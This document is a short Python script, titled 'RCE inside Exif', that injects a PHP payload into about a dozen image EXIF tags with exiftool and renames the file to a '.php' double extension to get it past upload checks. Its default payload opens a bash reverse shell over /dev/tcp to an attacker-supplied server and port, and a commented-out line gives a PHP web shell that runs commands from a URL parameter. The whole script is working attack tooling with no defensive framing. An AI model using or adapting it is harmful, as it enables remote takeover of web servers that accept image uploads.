#!/usr/bin/python3
import sys
import argparse
import subprocess
import os
 
exif_tags = [
   "ImageDescription",
   "Make",
   "Model",
   "Software",
   "Artist",
   "Copyright",
   "XPTitle",
   "XPComment",
   "XPAuthor",
   "XPSubject",
   "Location",
   "Description",
   "Author",
   "Comment"
]
 
parser = argparse.ArgumentParser(description='RCE inside Exif')
group = parser.add_mutually_exclusive_group()
parser.add_argument('-i', '--input', type=str, help="Input file")
group.add_argument('-p', '--payload', type=str, help="Payload (optional)")
group.add_argument('-s', '--server', type=str, help="Reverse shell server")
parser.add_argument('-P', '--port', type=int, help="port")
argv = parser.parse_args()

if not argv.input:
    print("Use --help")
    exit()
if not argv.payload:
    #argv.payload = "<?php echo \"<pre>\"; system($_GET['cmd']) ?>"
    argv.payload = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/{}/{} 0>&1\'"); ?>'.format(argv.server, argv.port)
try:
    for exif in exif_tags:
        each_tag = "-{}={}".format(exif, argv.payload)
        print("exiftool" + each_tag + argv.input)
        subprocess.call(["exiftool", each_tag, argv.input])
    subprocess.call(["exiftool", argv.input])
    splinput = argv.input.split('.')[0] + '.php' + '.' + argv.input.split('.')[1]
    os.system('mv {} {}'.format(argv.input, splinput))
except Exception as E:
    print(E)
